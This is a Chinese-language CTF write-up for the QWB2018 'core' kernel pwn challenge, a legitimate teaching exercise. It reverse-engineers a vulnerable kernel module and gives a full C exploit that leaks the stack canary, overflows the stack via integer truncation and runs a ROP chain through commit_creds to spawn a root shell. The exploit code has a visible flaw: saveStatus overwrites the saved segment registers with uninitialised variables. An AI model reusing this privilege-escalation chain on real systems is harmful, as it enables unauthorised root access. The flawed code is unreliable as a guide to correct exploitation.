---
title: Kernel Pwn 练习小记 01
published: 2026-10-26
description: '第一次 Kernel Pwn '
image: ''
tags:
  - pwn
category: Kernel
draft: false
lang: zh_CN
---

> 相比起来，Kernel Pwn 的入门不算很轻松，~~（至少对笔者是这样的）~~
> 
> 👴 终于学会 Kernel Pwn 啦

# QWB2018CORE

[附件下载](https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/linux/kernel-mode/QWB2018-core/core_give.tar.gz)

## Basic

> 笔者在这里引用了a3 的文章片段作为基础

✳ **内核态的 ROP 与用户态的 ROP 一般无二，只不过利用的 gadget 变成了内核中的 gadget，所需要构造执行的 ropchain 由**`system("/bin/sh")`**变为了** `commit_creds(prepare_kernel_cred(&init_task)) 或 commit_creds(&init_cred)`

当成功执行如上函数之后，当前线程的 cred 结构体便变为 init 进程的 cred 的拷贝，我们也就获得了 root 权限，此时在用户态起一个 shell 便能获得 root shell

- 需要注意的是 **旧版本内核上所用的提权方法 `commit_creds(prepare_kernel_cred(NULL))` 已经不再能被使用，在高版本的内核当中 `prepare_kernel_cred(NULL)` 将不再返回一个 root cred**，这也令 ROP chain 的构造变为更加困难

### 状态保存

通常情况下，我们的exploit需要进入到内核当中完成提权，而我们最终仍然需要**着陆回用户态**以获得一个root权限的shell，因此在我们的exploit进入内核态之前我们需要**手动模拟用户态进入内核态的准备工作**——**保存各寄存器的值到内核栈上**，以便于后续着陆回用户态

通常情况下保存各寄存器值到我们自己定义的变量中，以便于构造 rop 链：

### 返回用户态

内核态返回用户态的过程：

- `swapgs`指令恢复用户态GS寄存器
- `sysretq`或者`iretq`恢复到用户空间

那么我们只需要在内核中找到相应的gadget并执行`swapgs;iretq`就可以成功着陆回用户态

通常来说，我们应当构造如下rop链以返回用户态并获得一个shell：

```asm
↓   swapgs
    iretq
    user_shell_addr
    user_cs
    user_eflags //64bit user_rflags
    user_sp
    user_ss
```

> 内核ROP和用户态的ROP本质上没有太大区别，细节便不在此赘叙了

## check

### 查看 start.sh

查看 start.sh ，原先的 64M 太小了，换成 128M

```shell
qemu-system-x86_64 \
-m 64M \
-kernel ./bzImage \
-initrd  ./core.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \
-s  \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  \
```

首先第一步，我们应该解压core.cpio 看看里面有什么

先查看以下core.cpio的文件类型

```bash
file core.cpio
```

文件信息如下，可以看到这是一个gzip文件

```
core.cpio: gzip compressed data, last modified: Fri Oct  5 14:08:36 2018, max compressio2
```

我们可以使用linux带的gunzip解压，但是这里要注意的是，gunzip解压的文件，后缀名必须是.gz，所以我们可以修改一下文件后缀名

```bash
mkdir core
mv core.cpio core/core.cpio.gz
cd core
gunzip core.cpio.gz
```

之后该解压这个 cpio 文件了

```bash
cpio -idmv < core.cpio
```

### 文件分析 init

一般情况下 etc/rcS 或者 init文件是系统的初始化脚本，这里只有init 我们看一下内容

```sh
#!/bin/sh
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs none /dev
/sbin/mdev -s
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts
chmod 666 /dev/ptmx
cat /proc/kallsyms > /tmp/kallsyms
echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
ifconfig eth0 up
udhcpc -i eth0
ifconfig eth0 10.0.2.15 netmask 255.255.255.0
route add default gw 10.0.2.2 
insmod /core.ko

poweroff -d 120 -f &
setsid /bin/cttyhack setuidgid 1000 /bin/sh
echo 'sh end!\n'
umount /proc
umount /sys

poweroff -d 0  -f
```

注意到加载了 core.ko 这个模块，对它进行逆向分析。先看看 `init_module()` 它是 `insmod core.ko` 时第一个运行的。

```c
// Alternative name is 'init_core'
__int64 init_module()
{
  core_proc = proc_create("core", 438, 0, &core_fops);
  printk("core: created /proc/core entry\n");
  return 0;
}
```

这个就是简单地注册了一下文件的操作，core_fops放的就是我们注册的驱动的操作。

根据core_fops放的函数地址，我们一个个看过去。

### 逆向分析 core.ko

**core_write**

```c
__int64 __fastcall core_write(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  printk("  core: called core_writen");
  if ( a3 <= 0x800 && !copy_from_user(&name, a2, a3) )
    return (unsigned int)a3;
  printk("  core: error copying data from userspacen", a2);
  return 0xFFFFFFF2LL;
}
```

**core_release**

```c
__int64 core_release()
{
  printk("  core: release\n");
  return 0;
}
```

**core_ioctl**

```c
__int64 __fastcall core_ioctl(__int64 a1, int choice, const void *value)
{
  switch ( choice )
  {
    case 0x6677889B:
      core_read(value);
      break;
    case 0x6677889C:
      printk("  core: %d\n", (_DWORD)value);
      off = (__int64)value;
      break;
    case 0x6677889A:
      printk("  core: called core_copy\n");
      core_copy_func((__int64)value);
      break;
  }
  return 0;
}
```

`core_ioctl()` 提供了三个选项，继续看三个选项，分别是 `core_read()` , `core_copy_func()` 和修改 `off`

**core_read**

```c
unsigned __int64 __fastcall core_read(const void *user_addr)
{
  char *v2; // rdi
  __int64 i; // rcx
  unsigned __int64 result; // rax
  char v5[64]; // [rsp+0h] [rbp-50h] BYREF
  unsigned __int64 v6; // [rsp+40h] [rbp-10h]

  v6 = __readgsqword(0x28u);
  printk("  core: called core_read\n");
  printk("  %d %p\n", off, user_addr);
  v2 = v5;
  for ( i = 16; i; --i )
  {
    *(_DWORD *)v2 = 0;
    v2 += 4;
  }
  strcpy(v5, "Welcome to the QWB CTF challenge.\n");
  result = copy_to_user(user_addr, &v5[off], 64);
  if ( !result )
    return __readgsqword(0x28u) ^ v6;
  __asm { swapgs }
  return result;
}
```

`core_read()` 将 64 字节复制到用户空间

**core_copy_func**

```c
__int64 __fastcall core_copy_func(__int64 num)
{
  _QWORD v2[10]; // [rsp+0h] [rbp-50h] BYREF

  v2[8] = __readgsqword(0x28u);
  printk("  core: called core_writen");
  if ( num > 63 )
  {
    printk("  Detect Overflow");
    return 0xFFFFFFFFLL;
  }
  else
  {
    qmemcpy(v2, &name, (unsigned __int16)num);  // 溢出
    return 0;
  }
}
```

这里已经很明显了，存在一个溢出漏洞，长整数 `num` 取低16位作为无符号整数使用。可以通过 **`core_write()`** 来写 name 打 KROP。

但是第一次做 Kernel Pwn 的我并不很会写 exp ，我的 exp 参考了 wsxk 的博客。

## 利用思路

### 1. 泄露 Canary

`core_ioctl()` 的 `0x6677889C` 选项可以修改 `off` 的值，然后我们通过 `core_read()` 就可以读出 canary

### 2. 编写 payload

首先需要 gadget ，从带符号的内核文件 vmlinux 里提取。

```bash
ROPgadget --binary vmlinux > gadget.txt
```

我们要执行的 `commit_cred(prepare_kernel_cred(0))` 函数的地址在 init 中被导入到了 `/tmp/kallsyms` 里面，我们需要自己编写函数动态地获取（因为每次重新启动内核 地址就不一样）然后执行 swagfs 和 iretq

### 3.利用core_write写入payload

这个就很简单了，利用整数溢出写一个负数进去，因为最终写的时候是16位的，很容易就写进去了。

### 4.返回用户态执行getshell

swagfs + iretq指令就是用来返回用户态的。这个是有常规操作的。为什么要返回用户态执行getshell？因为getshell在用户态做更容易。

## EXP

笔者的 EXP 如下

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>

unsigned long long commit_cred = 0;
unsigned long long prepare_kernel_cred = 0;

unsigned long long user_cs, user_ss, user_rflags, user_sp;

void saveStatus(void)
{
    unsigned short cs16, ss16;
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax prefix;");
    user_cs = cs16;
    user_ss = ss16;
}

void get_address(void)
{
    FILE *fd = fopen("/tmp/kallsyms", "r");
    if (fd == NULL) {
        printf("error in open file kallsyms!\n");
        exit(1);
    }
    unsigned long long addr;
    char type[0x10];
    char func_name[0x100];
    while (fscanf(fd, "%llx%s%s", &addr, type, func_name) != EOF) {
        if (commit_cred && prepare_kernel_cred)
            break;
        if (!strcmp(func_name, "prepare_kernel_cred"))
            prepare_kernel_cred = addr;
        if (!strcmp(func_name, "commit_creds"))
            commit_cred = addr;
    }
    fclose(fd);
    printf("commit_addr:%llx\n", commit_cred);
    printf("prepare_kernel_cred:%llx\n", prepare_kernel_cred);
}

void get_shell(void)
{
    if (!getuid())
        printf("get root!\n");
    else
        printf("get shell error! uid=%d\n", getuid());

    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    execve("/bin/sh", argv, envp);
    exit(0);
}

void core_read(int fd, void *addr)
{
    ioctl(fd, 0x6677889B, addr);
}

void set_off(int fd, unsigned long value)
{
    ioctl(fd, 0x6677889C, value);
}

int main(void)
{
    saveStatus();
    get_address();

    int fd = open("/proc/core", O_RDWR);
    if (fd < 0) {
        printf("open /proc/core failed\n");
        exit(1);
    }

    set_off(fd, 0x40);

    unsigned long long buf[8] = {0};
    core_read(fd, buf);
    unsigned long long canary = buf[0];
    printf("canary: %llx\n", canary);

    unsigned long long kernel_base = commit_cred - 0x9c8e0;
    unsigned long long offset = kernel_base - 0xffffffff81000000;

    unsigned long long pop_rdi = 0xffffffff81000b2f;
    unsigned long long pop_rdx = 0xffffffff810a0f49;
    unsigned long long pop_rcx = 0xffffffff81021e53;
    unsigned long long mov_rdi_rax_call_rdx = 0xffffffff8101aa6a;
    unsigned long long swapgs_popfq_ret = 0xffffffff81a012da;
    unsigned long long iretq_ret = 0xffffffff81050ac2;

    unsigned long long rop[0x100];
    memset(rop, 0, sizeof(rop));

    // core_copy_func: [rsp+0x00..0x3f] buf / [0x40] canary / [0x48] saved rbx / [0x50] ret
    int i;
    for (i = 0; i < 10; i++)
        rop[i] = canary;

    rop[i++] = pop_rdi + offset;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = pop_rdx + offset;
    rop[i++] = pop_rcx + offset;              // rdx = pop rcx; ret，用来吃掉 call 压的返回地址
    rop[i++] = mov_rdi_rax_call_rdx + offset; // rdi = rax(cred)，call rdx -> pop rcx -> ret
    rop[i++] = commit_cred;                   // 被 pop rcx 的 ret 跳进来，正常返回后落到 swapgs
    rop[i++] = swapgs_popfq_ret + offset;
    rop[i++] = 0;                             // popfq 吃掉
    rop[i++] = iretq_ret + offset;            // ret 跳到这里
    rop[i++] = (unsigned long long)get_shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(fd, rop, 0x800);
    ioctl(fd, 0x6677889A, 0xffffffffffff0000UL|0x100);
    return 0;
}
```

## 调试小记

做内核题也同样是离不开调试的，强大的 gdb 可以帮我们调试。这样启动 gdb ：

```bash
gdb ./vmlinux
```

之后这样连接到我们通过 `./start.sh` 启动的 Kernel

```
target remote :1234
```

之后就可以进行调试了，调试时最好修改一下 cpio 文件把我们改成 root 并且在 start.sh 里设置 nokaslr，这样方便从 `/sys/module/core/sections/.text` 获取地址。

> ~~之后就是考验大手子们的调试能力啦~~

调试时遇到的一个地方是，IDA 将 `core_copy_func()` 中 `rep movsb` 指令翻译成 `qmemcpy()` 调试的时候当然是看不到 `qmemcpy()` 的，而是执行到 `rep movsb` 时循环执行，原来是这样的

- **`MOVSB` (Move String Byte)**：负责搬运**一个字节**。它默认从 `DS:SI`（或 `ESI`）指向的源地址读取一个字节，写入 `ES:DI`（或 `EDI`）指向的目标地址，然后根据方向标志位（DF）自动递增或递减这两个指针。
  
- **`REP` (Repeat)**：作为前缀，指示 CPU **重复**执行后面的指令。重复次数由计数寄存器 `CX`（或 `ECX`/`RCX`）控制。每执行一次，`CX` 自动减 1，直到 `CX` 为 0 时停止。
  

寄存器设置如下：

- **`RSI`**：源地址
  
- **`RDI`**：目标地址
  
- **`RCX`**：要复制的字节数
  

大致就是每执行一次复制一个字节，每次执行 `RSI` 和 `RDI` 加 1 ，`RCX` 减 1 直到 `CX` 为 0 时停止。